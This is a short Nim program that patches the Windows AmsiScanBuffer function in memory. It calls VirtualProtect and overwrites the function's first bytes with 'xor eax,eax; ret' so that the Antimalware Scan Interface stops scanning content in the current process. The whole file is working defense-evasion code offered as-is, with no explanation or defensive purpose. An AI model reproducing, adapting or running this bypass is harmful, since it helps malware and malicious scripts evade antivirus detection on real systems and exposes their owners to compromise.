import winim

var patchByteArray: array[3, byte] = [byte 0x33, 0xC0, 0xC3]
# xor eax,eax
# ret

proc PatchAmsiScanBuffer*(): BOOL =
    var fnAddr = GetProcAddress(LoadLibraryA("AMSI"), "AmsiScanBuffer")
    var oldProtection: DWORD
    if VirtualProtect(fnAddr, sizeof(patchByteArray), PAGE_EXECUTE_READWRITE, &oldProtection) == FALSE:
        return FALSE

    copyMem(fnAddr, &patchByteArray[0], sizeof(patchByteArray))

    if VirtualProtect(fnAddr, sizeof(patchByteArray), oldProtection, &oldProtection) == FALSE:
        return FALSE

    return TRUE


if PatchAmsiScanBuffer():
    echo("Patched AmsiScanBuffer")
else:
    echo("Failed To Patch AmsiScanBuffer")